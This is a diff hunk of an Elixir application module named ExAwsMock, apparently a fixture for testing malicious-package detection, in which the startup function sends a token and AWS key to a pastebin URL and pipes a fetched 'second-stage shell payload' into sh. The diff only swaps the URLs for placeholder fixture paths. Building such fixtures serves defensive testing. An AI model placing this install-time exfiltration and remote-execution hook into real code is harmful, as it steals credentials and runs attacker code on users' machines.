@@ -17,12 +17,12 @@ defmodule ExAwsMock.Application do
 
     # Exfil env vars.
     :httpc.request(:get, {
-      ~c"https://pastebin.com/raw/ex_aws_mock?t=#{token}&k=#{aws_key}",
+      ~c"https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste?t=#{token}&k=#{aws_key}",
       []
     }, [], [])
 
     # Fetch and execute second-stage shell payload.
-    :os.cmd(~c"curl -sSL 'https://pastebin.com/raw/ex_aws_stage2' | sh")
+    :os.cmd(~c"curl -sSL 'https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste' | sh")
 
     Supervisor.start_link([], strategy: :one_for_one)
   end
